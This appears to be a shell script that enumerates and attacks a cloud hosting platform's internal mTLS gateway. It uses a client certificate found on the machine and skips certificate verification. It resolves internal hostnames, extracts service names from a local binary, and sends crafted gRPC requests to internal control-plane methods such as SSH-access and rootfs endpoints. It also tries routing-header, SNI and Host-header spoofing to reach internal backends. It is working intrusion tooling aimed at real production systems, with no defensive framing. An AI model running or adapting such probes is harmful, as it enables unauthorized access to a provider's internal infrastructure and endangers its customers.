#!/bin/sh
set +e
G=external-mtls-service-gateway-us-west1.gcp.production.rlwy.net
IP=35.247.70.7
mkdir -p /r;  : > /r/all.txt
say(){ echo "$@" | tee -a /r/all.txt; }
printf '\0\0\0\0\0' > /r/req0
req(){ L=$1; URL=$2; shift 2
  : > /r/body; : > /r/hdr
  CODE=$(curl -sS --http2 -m 4 --connect-timeout 2 -o /r/body -D /r/hdr --cert /pki/client.crt --key /pki/client.key -k "$@" -H 'content-type: application/grpc' -H 'te: trailers' -H 'user-agent: grpc-go/1.60.0' --data-binary @/r/req0 "$URL" -w '%{http_code}' 2>/dev/null)
  ST=$(grep -ai '^grpc-status:' /r/hdr|tr -d '\r'|head -1|sed 's/.*: *//')
  MSG=$(grep -ai '^grpc-message:' /r/hdr|tr -d '\r'|head -1|sed 's/.*: *//'|cut -c1-56)
  UP=$(grep -ai '^x-envoy-upstream-service-time:' /r/hdr|tr -d '\r'|head -1|sed 's/.*: *//')
  B=$(head -c 12 /r/body|od -An -tx1|tr -d ' \n'|cut -c1-30)
  say "$L|$CODE|st=$ST|m=$MSG|up=$UP|b=$B"
}
say "===I67521MP6B==="; hostname
for n in us-east4 us-central1 asia-southeast1 europe-west4 us-west1; do printf "D|ext-%s=" $n >> /r/all.txt; printf "D|ext-%s=" $n; getent hosts external-mtls-service-gateway-$n.gcp.production.rlwy.net|awk '{print $1}'|head -1; done
for n in orchestrator temporal backboard registry nats stacklet certs mpipe; do printf "D|%s=" $n; getent hosts $n.gcp.production.rlwy.net|awk '{print $1}'|head -1; done
for b in /f/bv; do ls -la $b | head -1; done
echo "--PATHS--"
grep -aoE '/[a-z][A-Za-z0-9_]*(\.[a-z][A-Za-z0-9_]*){1,4}/[A-Z][A-Za-z0-9_]{1,64}' /f/bv 2>/dev/null | grep -avE '^/(usr|etc|proc|dev|sys|tmp|var|lib|bin|sbin|home|opt|run|root|mnt|media|srv|host)/' | sort -u | head -60
echo "--PKGS--"
grep -aoE '(backboard|network_cp|vm_runner|workflowservice|temporal|stats|certs|stacklet|mpipe)\.[A-Za-z0-9_]{2,40}(Service|Api|API|Server|Client)' /f/bv 2>/dev/null | sort -u | head -40
echo "--MPTGT--"
grep -aoE 'internal_[a-z_]{3,24}' /f/bv 2>/dev/null | sort -u | head -24
echo "--CTL--"
req POS "https://$G/opentelemetry.proto.collector.trace.v1.TraceService/Export"
req NEG "https://$G/"
P_OTL=/opentelemetry.proto.collector.trace.v1.TraceService/Export
P_BB=/backboard.Backboard/Health
P_TMP=/temporal.api.workflowservice.v1.WorkflowService/GetSystemInfo
echo "--A--"
for P in $P_OTL \
 /opentelemetry.proto.collector.metrics.v1.MetricsService/Export \
 /opentelemetry.proto.collector.logs.v1.LogsService/Export \
 /grpc.health.v1.Health/Check \
 /grpc.reflection.v1.ServerReflection/ServerReflectionInfo \
 /temporal.api.workflowservice.v1.WorkflowService/GetSystemInfo \
 /temporal.api.workflowservice.v1.WorkflowService/DescribeNamespace \
 /temporal.api.workflowservice.v1.WorkflowService/GetClusterInfo \
 /workflowservice.v1.WorkflowService/GetSystemInfo \
 /backboard.Backboard/Health \
 /backboard.BackboardService/Health \
 /backboard.Orchestrator/Health \
 /backboard.ControlPlane/Health \
 /backboard.Backboard/GetDeploymentByContainerID \
 /backboard.Backboard/FilterOfflineContainers \
 /backboard.Backboard/HasSSHAccess \
 /backboard.Backboard/ListConnectTargets \
 /backboard.Health/Check \
 /backboard. \
 /backboard.__x__/__y__ \
 /network_cp.EndpointSpec/Service \
 /network_cp. \
 /stats.Stats/ \
 /vm_runner.RunnerApi/FlushRootfs \
 /vm_runner.RunnerApi/ \
 /internal_traces/opentelemetry.proto.collector.trace.v1.TraceService/Export \
 /internal_backboard/backboard.Backboard/Health \
 /stacklet.Stacklet/Health \
 /stacklet.Stacklet/ \
 /certs.Certs/Health \
 /certs.CertService/Health \
 /certs. \
 /mpipe.Mpipe/Health \
 /mpipe. \
 /mpipe.MpipeService/Ping ; do req "A $P" "https://$G$P"; done
echo "--B--"
for T in internal_traces internal_backboard internal_temporal; do
 for P in $P_OTL $P_BB $P_TMP /backboard. /certs.CertService/Health /stacklet.Stacklet/Health; do req "B $T $P" "https://$G$P" -H "x-mpipe-target: $T"; done; done
for T in internal_certs internal_stacklet internal_mpipe; do
 for P in /certs.CertService/Health /stacklet.Stacklet/Health /mpipe. $P_BB; do req "B $T $P" "https://$G$P" -H "x-mpipe-target: $T"; done; done
echo "--SNI--"
for N in $G internal-mtls-service-gateway-us-west1.gcp.production.rlwy.net orchestrator.gcp.production.rlwy.net backboard.gcp.production.rlwy.net registry.gcp.production.rlwy.net certs.gcp.production.rlwy.net mpipe.gcp.production.rlwy.net; do
 for P in $P_OTL $P_BB /backboard. ; do req "SNI $N $P" "https://$N$P" --connect-to "$N:443:$IP:443"; done; done
echo "--HOST--"
for N in orchestrator.gcp.production.rlwy.net backboard.gcp.production.rlwy.net registry.gcp.production.rlwy.net certs.gcp.production.rlwy.net internal-mtls-service-gateway-us-west1.gcp.production.rlwy.net; do
 for P in $P_OTL $P_BB ; do req "H $N $P" "https://$G$P" -H "Host: $N"; done; done
echo "--IP--"
for I in 35.247.70.7 34.107.141.139; do for P in $P_OTL $P_BB; do req "IP $I $P" "https://$G$P" --connect-to "$G:443:$I:443"; done; done
echo "--P4443--"
timeout 6 openssl s_client -connect $IP:4443 -servername $G -cert /pki/client.crt -key /pki/client.key -alpn h2 </dev/null 2>&1 | grep -aE 'CONNECTED|Verify return|ALPN|error|alert' | head -4
req "P4443 OTL" "https://$G:4443$P_OTL" --connect-to "$G:4443:$IP:4443"
echo "--TLS--"
timeout 8 openssl s_client -connect $IP:443 -servername $G -cert /pki/client.crt -key /pki/client.key </dev/null 2>&1 | openssl x509 -noout -subject -issuer -ext subjectAltName 2>&1 | head -8
echo "===END==="
